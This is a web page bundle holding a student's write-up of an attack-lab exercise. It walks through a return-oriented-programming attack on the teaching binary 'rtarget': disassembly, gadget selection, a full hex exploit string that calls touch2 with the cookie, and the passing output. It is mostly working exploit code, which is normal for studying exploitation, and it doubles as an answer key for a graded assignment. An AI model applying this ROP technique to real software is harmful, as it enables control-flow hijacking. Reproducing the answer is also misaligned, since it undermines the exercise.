import{_ as e,X as a,Y as d,a1 as i}from"./framework-9435e890.js";const n={},s=i(`<h6 id="run" tabindex="-1"><a class="header-anchor" href="#run" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>objdump <span class="token parameter variable">--disassemble</span> rtarget <span class="token operator">&gt;</span> rtarget.asm
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="read-file-rtarget-asm" tabindex="-1"><a class="header-anchor" href="#read-file-rtarget-asm" aria-hidden="true">#</a> Read File <code>rtarget.asm</code></h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>...
0000000000401b6a &lt;touch2&gt;:
...
0000000000401d0f &lt;start_farm&gt;:
  401d0f:	b8 01 00 00 00       	mov    $0x1,%eax
  401d14:	c3                   	retq

0000000000401d15 &lt;addval_420&gt;:
  401d15:	8d 87 48 89 c7 94    	lea    -0x6b3876b8(%rdi),%eax
  401d1b:	c3                   	retq

0000000000401d1c &lt;setval_146&gt;:
  401d1c:	c7 07 58 92 90 90    	movl   $0x90909258,(%rdi)
  401d22:	c3                   	retq

0000000000401d23 &lt;addval_451&gt;:
  401d23:	8d 87 00 58 c3 1c    	lea    0x1cc35800(%rdi),%eax
  401d29:	c3                   	retq

0000000000401d2a &lt;addval_158&gt;:
  401d2a:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  401d30:	c3                   	retq

0000000000401d31 &lt;setval_387&gt;:
  401d31:	c7 07 58 c3 08 57    	movl   $0x5708c358,(%rdi)
  401d37:	c3                   	retq

0000000000401d38 &lt;getval_439&gt;:
  401d38:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
  401d3d:	c3                   	retq

0000000000401d3e &lt;getval_205&gt;:
  401d3e:	b8 b7 d7 58 c2       	mov    $0xc258d7b7,%eax
  401d43:	c3                   	retq

0000000000401d44 &lt;setval_398&gt;:
  401d44:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  401d4a:	c3                   	retq

0000000000401d4b &lt;mid_farm&gt;:
...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="design-gadget" tabindex="-1"><a class="header-anchor" href="#design-gadget" aria-hidden="true">#</a> Design Gadget</h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>58        popq %rax
c3        ret
48 89 c7  movq %rax, %rdi
c3        ret
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="search-gadget-in-rtarget-asm" tabindex="-1"><a class="header-anchor" href="#search-gadget-in-rtarget-asm" aria-hidden="true">#</a> Search Gadget in <code>rtarget.asm</code></h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>0000000000401d23 &lt;addval_451&gt;:
  401d23:	8d 87 00 58 c3 1c    	lea    0x1cc35800(%rdi),%eax
  401d29:	c3                   	retq
0000000000401d2a &lt;addval_158&gt;:
  401d2a:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  401d30:	c3                   	retq
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="read-file-cookie-txt" tabindex="-1"><a class="header-anchor" href="#read-file-cookie-txt" aria-hidden="true">#</a> Read File <code>cookie.txt</code></h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>0x3a9a6c2f
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="write-file-phase-4-txt" tabindex="-1"><a class="header-anchor" href="#write-file-phase-4-txt" aria-hidden="true">#</a> Write File <code>phase-4.txt</code></h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
26 1d 40 00 00 00 00 00
2f 6c 9a 3a 00 00 00 00
2c 1d 40 00 00 00 00 00
6a 1b 40 00 00 00 00 00
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-1" tabindex="-1"><a class="header-anchor" href="#run-1" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./hex2raw <span class="token operator">&lt;</span> phase-4.txt <span class="token operator">&gt;</span> phase-4.in
./rtarget <span class="token parameter variable">-i</span> phase-4.in
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="terminal-output" tabindex="-1"><a class="header-anchor" href="#terminal-output" aria-hidden="true">#</a> Terminal Output</h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Cookie: 0x3a9a6c2f
Touch2!: You called touch2(0x3a9a6c2f)
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,16),l=[s];function r(t,c){return a(),d("div",null,l)}const u=e(n,[["render",r],["__file","index.html.vue"]]);export{u as default};
